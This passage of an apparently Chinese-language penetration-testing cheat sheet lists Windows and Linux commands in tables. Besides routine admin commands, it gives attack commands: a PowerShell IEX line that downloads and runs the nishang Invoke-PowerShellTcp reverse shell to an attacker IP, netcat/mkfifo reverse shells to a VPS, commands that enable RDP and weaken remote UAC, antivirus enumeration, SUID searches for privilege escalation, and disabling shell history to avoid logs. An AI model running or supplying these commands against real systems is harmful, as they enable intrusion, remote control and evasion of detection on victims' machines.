<td>powershell IEX (New-Object Net.WebClient).DownloadString(‘<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp">https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1&#39;);Invoke-PowerShellTcp</a> -Reverse -IPAddress 攻击机IP -port 端口</td>
<td></td>
</tr>
</tbody></table>
<h3 id="WMIC"><a href="#WMIC" class="headerlink" title="WMIC"></a>WMIC</h3><table>
<thead>
<tr>
<th>作用</th>
<th>命令</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>查询本机服务</td>
<td>wmic service list brief</td>
<td></td>
</tr>
<tr>
<td>开启3389</td>
<td>wmic &#x2F;namespace:\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName &#x3D;’RDP-Tcp’) call setuserauthenticationrequired 0</td>
<td></td>
</tr>
<tr>
<td>查询已打补丁信息</td>
<td>wmic qfe</td>
<td></td>
</tr>
<tr>
<td>查询共享列表</td>
<td>wmic share</td>
<td></td>
</tr>
<tr>
<td>获取盘符</td>
<td>wmic logicaldisk where drivetype&#x3D;3 get deviceid</td>
<td></td>
</tr>
<tr>
<td>查询父进程PID</td>
<td>wmic process get name,processid,parentprocessid &#x2F;format:csv</td>
<td></td>
</tr>
<tr>
<td>获取域内用户详细信息</td>
<td>wmic useraccount get &#x2F;all</td>
<td></td>
</tr>
<tr>
<td>查询杀软</td>
<td>wmic&#x2F;namespace:\root\securitycenter2 path antivirusproduct</td>
<td></td>
</tr>
<tr>
<td>查询杀软</td>
<td>wmic &#x2F;Node:localhost &#x2F;Namespace:\root\SecurityCenter2 Path AntiVirusProduct</td>
<td></td>
</tr>
<tr>
<td>开启3389</td>
<td>wmic RDTOGGLE WHERE ServerName&#x3D;’%COMPUTERNAME%’ call SetAllowTSConnections 1</td>
<td></td>
</tr>
</tbody></table>
<h3 id="注册表"><a href="#注册表" class="headerlink" title="注册表"></a>注册表</h3><table>
<thead>
<tr>
<th>作用</th>
<th>命令</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>开启3389</td>
<td>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal” “Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f</td>
<td></td>
</tr>
<tr>
<td>开启net远程连接</td>
<td>reg add hklm\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System &#x2F;v LocalAccountTokenFilterPolicy &#x2F;t REG_DWORD &#x2F;d 1</td>
<td></td>
</tr>
</tbody></table>
<h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><table>
<thead>
<tr>
<th>工具</th>
<th>命令</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>screen</td>
<td>yum install epel-release<br>yum install screen</td>
<td>centos</td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<h3 id="匹配"><a href="#匹配" class="headerlink" title="匹配"></a>匹配</h3><table>
<thead>
<tr>
<th>作用</th>
<th>命令</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>匹配符合条件的行</td>
<td>grep 字符串</td>
<td></td>
</tr>
<tr>
<td>匹配除指定字符串外的行</td>
<td>grep -v 字符串</td>
<td></td>
</tr>
</tbody></table>
<h3 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h3><table>
<thead>
<tr>
<th>作用</th>
<th>命令</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>获取进程打开的文件信息</td>
<td>lsof</td>
<td></td>
</tr>
<tr>
<td>根据进程号查找进程</td>
<td>pidof “xxx”</td>
<td></td>
</tr>
<tr>
<td>显示进程及守护进程信息</td>
<td>ps ajfx</td>
<td>从做往右依次为PPID、PID、PGID（组编号）、<br>SID、TTY、TPGID、STAT（+号表示前台运行）、UID、TIME 、COMMAND</td>
</tr>
<tr>
<td>列出进程信息</td>
<td>ps aux</td>
<td></td>
</tr>
<tr>
<td>列出进程信息</td>
<td>ps -ef</td>
<td></td>
</tr>
<tr>
<td>根据PID进入其网络命名空间network namespace</td>
<td>nsenter  -n -t pid值</td>
<td></td>
</tr>
</tbody></table>
<h3 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h3><table>
<thead>
<tr>
<th>作用</th>
<th>命令</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>查看文件ID详情</td>
<td>ls -l</td>
<td></td>
</tr>
<tr>
<td>设置操作命令不记录日志</td>
<td>set +o history</td>
<td></td>
</tr>
<tr>
<td>查看文件详情</td>
<td>ll</td>
<td></td>
</tr>
<tr>
<td>查看文件详情</td>
<td>ls -a</td>
<td>–all的缩写，显示所有的文件<br>可查看隐藏的文件，隐藏文件.号开头</td>
</tr>
<tr>
<td>查看文件详情</td>
<td>ls -A</td>
<td>–almost-all缩写<br>显示所有的文件，包括隐藏文件<br>但不包括表示当前目录.和上级目录..这两个文件</td>
</tr>
<tr>
<td>创建文件</td>
<td>touch 文件名</td>
<td>创建的文件是空文件</td>
</tr>
<tr>
<td>创建文件夹</td>
<td>mkdir 文件夹</td>
<td></td>
</tr>
<tr>
<td>查询文件创建时间、修改时间、访问时间</td>
<td>stat 文件名</td>
<td></td>
</tr>
<tr>
<td><strong>合并去重文件内容</strong></td>
<td>&#96;sort 旧文件名</td>
<td>uniq &gt; 新文件名&#96;</td>
</tr>
<tr>
<td>删除文件</td>
<td>rm 文件路径</td>
<td></td>
</tr>
<tr>
<td><strong>搜索具有suid权限的文件</strong></td>
<td>find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</td>
<td>&#x2F; 表示从文件系统的顶部（根）开始并找到每个目录<br>-u&#x3D;s 表示查找root用户拥有的文件<br>-type表示我们正在寻找的文件类型<br>f 表示常规文件，而不是目录或特殊文件</td>
</tr>
<tr>
<td><strong>搜索具有suid权限的文件</strong></td>
<td>find &#x2F; -perm -g&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</td>
<td>-perm 表示搜索随后的权限<br>2 表示该进程的第二个文件描述符，即stderr（标准错误）<br>&gt; 表示重定向</td>
</tr>
<tr>
<td><strong>搜索具有suid权限的文件</strong></td>
<td>find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null</td>
<td></td>
</tr>
<tr>
<td><strong>搜索具有suid权限的文件</strong></td>
<td>find &#x2F; -user root -perm -4000 -exec ls -ldb {};</td>
<td></td>
</tr>
<tr>
<td>根据文件名搜索</td>
<td>find &#x2F; -name 文件名</td>
<td></td>
</tr>
<tr>
<td>根据文件名和文件修改时间查找</td>
<td>find &#x2F; -mtime 时间 -name 文件名</td>
<td>-mtime -2表示2天以内，-mtime +2 表示2天以前</td>
</tr>
<tr>
<td>根据文件名和文件访问时间查找</td>
<td>find &#x2F; -atime 时间 -name 文件名</td>
<td>-atime -2表示2天以内，-atime +2 表示2天以前</td>
</tr>
<tr>
<td>根据文件名和文件创建时间查找</td>
<td>find &#x2F; -ctime 时间 -name 文件名</td>
<td>-ctime -2表示2天以内，-ctime +2 表示2天以前</td>
</tr>
<tr>
<td>删除文件夹</td>
<td>rm -rf 文件夹路径</td>
<td></td>
</tr>
<tr>
<td>压缩文件为tar.gz</td>
<td>tar -zcvf 文件名.tar.gz 路径</td>
<td>.tar.gz不能缺省，文件名.tar.gz为压缩后的文件</td>
</tr>
<tr>
<td>解压缩tar.gz到当前目录</td>
<td>tar -zxvf 文件名</td>
<td></td>
</tr>
<tr>
<td>解压缩tar.gz到指定目录下</td>
<td>tar -zxvf 文件名 -C 文件夹</td>
<td></td>
</tr>
<tr>
<td>使用pyinstaller打包py文件</td>
<td>python -m PyInstaller [参数] xxx.py</td>
<td></td>
</tr>
</tbody></table>
<h3 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h3><table>
<thead>
<tr>
<th>作用</th>
<th>命令</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>针对网卡发起扫描存活主机</td>
<td>arp-scan -l</td>
<td></td>
</tr>
<tr>
<td>查看ip信息</td>
<td>ifconfig</td>
<td></td>
</tr>
<tr>
<td>打开网卡可视化编辑工具</td>
<td>nm-connection-editor</td>
<td></td>
</tr>
<tr>
<td>配置网卡IP</td>
<td>ifconfig 网卡 IP&#x2F;掩码位数</td>
<td></td>
</tr>
<tr>
<td>fpring探测存活</td>
<td>fping -gaq 网段&#x2F;24</td>
<td></td>
</tr>
<tr>
<td>查看本地开放端口</td>
<td>netstat -ntpl</td>
<td></td>
</tr>
<tr>
<td>查看wget后台下载信息</td>
<td>tail -f wget-log</td>
<td></td>
</tr>
<tr>
<td>根据网卡抓取流量</td>
<td>tcpdump -i 网卡</td>
<td>若想值查看需要的IP时，可使用<strong>dst host 地址 -v</strong>进行地址过滤</td>
</tr>
<tr>
<td>使用正则获取网站中所包含的其他URL</td>
<td><strong>curl <a target="_blank" rel="noopener" href="http://host.xx/file.js">http://host.xx/file.js</a> | grep -Eo “(http|https):&#x2F;&#x2F;[a-zA-Z0-9.&#x2F;?&#x3D;_-]<em>“</em></strong></td>
<td></td>
</tr>
<tr>
<td>下载文件</td>
<td>wget URL</td>
<td></td>
</tr>
<tr>
<td>下载文件，后台运行</td>
<td>wget -b URL</td>
<td>可使用tail -f wget-log查看下载情况</td>
</tr>
<tr>
<td>断点续传</td>
<td>wget -c URL</td>
<td></td>
</tr>
<tr>
<td>下载文件，并重命名文件</td>
<td>wget -o 文件名 URL</td>
<td></td>
</tr>
<tr>
<td>pip安装docker-compose</td>
<td>sudo apt-get -y install docker-compose</td>
<td>ubuntu系统</td>
</tr>
<tr>
<td>安装pip</td>
<td>sudo apt-get install python-pip</td>
<td>ubuntu系统</td>
</tr>
</tbody></table>
<h3 id="权限"><a href="#权限" class="headerlink" title="权限"></a>权限</h3><table>
<thead>
<tr>
<th>作用</th>
<th>命令</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>以管理员权限执行命令</td>
<td>sudo 命令</td>
<td>执行后需要输入当前用户密码</td>
</tr>
<tr>
<td>进入管理员命令行</td>
<td>sudo -i</td>
<td>执行后需要输入当前用户密码</td>
</tr>
<tr>
<td>为docker-compose创建软链接</td>
<td>sudo ln -s &#x2F;usr&#x2F;local&#x2F;bin&#x2F;docker-compose &#x2F;usr&#x2F;bin&#x2F;docker-compose</td>
<td></td>
</tr>
</tbody></table>
<h3 id="用户"><a href="#用户" class="headerlink" title="用户"></a>用户</h3><table>
<thead>
<tr>
<th>作用</th>
<th>命令</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>查看最近登录用户信息</td>
<td>w</td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<h3 id="系统"><a href="#系统" class="headerlink" title="系统"></a>系统</h3><table>
<thead>
<tr>
<th>作用</th>
<th>命令</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>查看系统内核版本</td>
<td>uname -srm</td>
<td></td>
</tr>
<tr>
<td>查看内核版本</td>
<td>hostnamectl</td>
<td></td>
</tr>
</tbody></table>
<h3 id="反连"><a href="#反连" class="headerlink" title="反连"></a>反连</h3><table>
<thead>
<tr>
<th>作用</th>
<th>命令</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>向VPS发送一个nc反弹shell</td>
<td>rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc VPS地址 端口 &gt;&#x2F;tmp&#x2F;f</td>
<td></td>
</tr>
<tr>
<td>向VPS发送一个nc反弹shell</td>
<td>nc VPS地址 3333 | &#x2F;bin&#x2F;bash | nc VPS地址 4444</td>
<td></td>
</tr>
<tr>
<td>node反弹shell</td>
<td>sudo node -e ‘child_process.spawn(“&#x2F;bin&#x2F;bash”,{stdio:[0,1,2]})’</td>
<td></td>
</tr>
</tbody></table>
<h2 id="MAC"><a href="#MAC" class="headerlink" title="MAC"></a>MAC</h2><table>
<thead>
<tr>
<th>作用</th>
<th>命令</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>移除程序“映像损坏”提示</td>
<td>sudo xaaatr -r -d com.apple.quarantine &#x2F;Applications&#x2F;程序.app</td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><table>
<thead>
<tr>
<th>作用</th>
<th>命令</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>mvn下载jar</td>
<td>mvn install</td>
<td></td>
</tr>
<tr>
<td>source-map还原js</td>
<td>reverse-sourcemap -v map文件路径 -o 文件夹</td>
<td></td>
</tr>
<tr>
<td>查看内存</td>
<td>show run</td>
<td>EG</td>
</tr>
<tr>
<td>查看用户信息</td>
<td>show webmaster user</td>
<td>EG</td>
</tr>
</tbody></table>

</div>

		</div>
		
	</div>

	<!-- 引入代码高亮的 js -->
	
<script src="/SafetyAtlas/lib/highlight/highlight.pack.js"></script>


	<!-- 引入 jquery -->
	
<script src="/SafetyAtlas/lib/jquery-3.4.1.min.js"></script>


	<!-- 引入 pjax -->
	
<script src="/SafetyAtlas/lib/jquery.pjax.js"></script>

	
	<!-- 引入 js 文件 -->
	
<script src="/SafetyAtlas/js/main.js"></script>


	

</body>
</html>